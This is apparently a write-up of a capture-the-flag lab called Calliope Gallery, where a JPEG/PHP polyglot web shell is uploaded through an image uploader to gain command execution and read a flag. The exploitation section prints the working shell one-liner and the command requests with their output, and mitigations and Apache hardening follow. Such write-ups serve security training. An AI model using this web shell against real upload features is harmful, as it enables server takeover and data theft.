---
title: "Unrestricted File Upload Leads to Remote Code Execution | Calliope Gallery"
date: 2026-06-09 19:00:00 +0530
categories: [A02 - Security Misconfiguration, Unrestricted File Upload]
tags: [file-upload, web-shell, php, rce, webverselabs-pro, calliope-gallery]
author: Shivansh Sharma
image:
    path: /assets/images/posts/calliope-gallery-unrestricted-file-upload.webp
    alt: Calliope Gallery Unrestricted File Upload
----------------------------------------------

## Lab Link

Lab: [Calliope Gallery](https://dashboard.webverselabs-pro.com/challenges/false-bottom)

## Overview

Calliope Gallery allows artists to upload portfolio images through their account dashboard.

A forgotten configuration change introduced for an image thumbnailing integration caused uploaded files to be processed by PHP within the upload directory. By uploading a specially crafted JPEG containing PHP code, it was possible to achieve Remote Code Execution and gain command execution on the server.

## Objective

Exploit the portfolio image upload functionality to execute commands on the server and retrieve the flag.

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── Unrestricted File Upload
    └── Web Shell Upload
        └── Remote Code Execution
```

The application allowed attacker-controlled files to be uploaded into a web-accessible directory where embedded PHP code was executed by the server.

## Reconnaissance

Create an account:

```bash
/register.php
```

After logging in, navigate to the portfolio management page:

```bash
/account/portfolio.php
```

The application allows users to upload portfolio images.

Initial testing showed that only JPEG files were accepted.

Attempting to upload a simple PHP shell disguised with a double extension failed.

```text
shell.php.jpeg
```

This indicated that some extension validation was in place.

## Exploitation

To bypass the upload restrictions, a valid JPEG header was combined with a PHP web shell.

```bash
printf '\xff\xd8\xff\xe0JFIF\x00<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

The resulting file was uploaded through the portfolio image uploader.

```text
shell.php.jpg
```

After the upload completed, the application's response revealed the file path.

```text
/portfolio/9/shell.php.jpg
```

To verify whether the PHP payload executed, the following request was made:

```text
/portfolio/9/shell.php.jpg?cmd=id
```

Response:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The successful execution of the `id` command confirmed that the uploaded file was being interpreted as PHP despite having a `.jpg` extension.

## Proof of Exploitation

With command execution confirmed, the next step was locating the flag file.

Search for the flag:

```text
/portfolio/9/shell.php.jpg?cmd=find+/+-name+flag.txt+2>/dev/null
```

Response:

```text
/flag.txt
```

Read the file:

```text
/portfolio/9/shell.php.jpg?cmd=cat+/flag.txt
```

Response:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The application relied on upload validation that focused on file extensions while storing uploaded files in a location where PHP execution remained enabled.

Although the uploaded file appeared to be an image, it contained embedded PHP code. Because the web server processed files within the upload directory as executable PHP, the attacker-controlled payload executed when the file was requested.

This resulted in a web shell being deployed through the image upload functionality.

## Impact

Successful exploitation allows attackers to:

* Upload and execute arbitrary server-side code
* Read sensitive files
* Access application secrets and credentials
* Modify application content
* Establish persistence
* Achieve full server compromise

Severity: **Critical**

## Mitigation

To prevent file upload vulnerabilities:

* Store uploaded files outside the web root
* Disable script execution in upload directories
* Validate file signatures instead of extensions alone
* Re-encode uploaded images before storage
* Generate random filenames
* Restrict allowed MIME types
* Scan uploads before processing

Example Apache hardening:

```apache
<Directory "/uploads">
    php_admin_flag engine off
</Directory>
```

## Real-World Insight

Unrestricted File Upload vulnerabilities remain one of the most dangerous issues in web applications because they frequently lead directly to Remote Code Execution.

Many real-world compromises begin with an image upload feature that performs insufficient validation while storing files in executable locations. Once a web shell is uploaded, attackers can interact with the server as if they had direct access to the underlying operating system.

Calliope Gallery demonstrates how a seemingly harmless image upload feature can become a complete server compromise when upload handling and web server configuration are not properly secured.
